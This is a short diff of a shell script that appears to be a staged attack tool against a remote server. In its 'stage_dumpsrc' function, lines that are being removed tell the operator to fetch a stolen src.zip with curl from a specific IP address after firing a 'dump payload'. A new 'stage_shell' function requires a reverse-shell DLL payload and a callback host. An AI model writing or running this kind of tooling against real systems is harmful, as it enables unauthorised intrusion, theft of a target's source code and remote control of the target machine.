@@ -307,16 +307,10 @@ stage_dumpsrc() {
     break
   done
   if [ "$done" -ne 1 ]; then die "could not fire the dump payload"; fi
-  info ""
-  info "Waiting 20s for the zipping to finish on the target..."
-  sleep 20
-  info "Now try downloading (try both):"
-  info "  curl -O http://125.18.164.11:82/src.zip"
-  info "  curl -O http://125.18.164.11:82/StartUp/src.zip"
-  banner "DUMP FIRED"
+  info "  DONE (see the timestamps or check src.zip manually)"
 }
 
-
+stage_shell() {
   [ -n "$VERSION" ] || die "Need a version (run versions first or set VERSION=)."
   [ -n "$REV_DLL" ] || die "No revshell payload in $PAYLOAD_DIR."
   if [ -z "$REV_HOST" ]; then
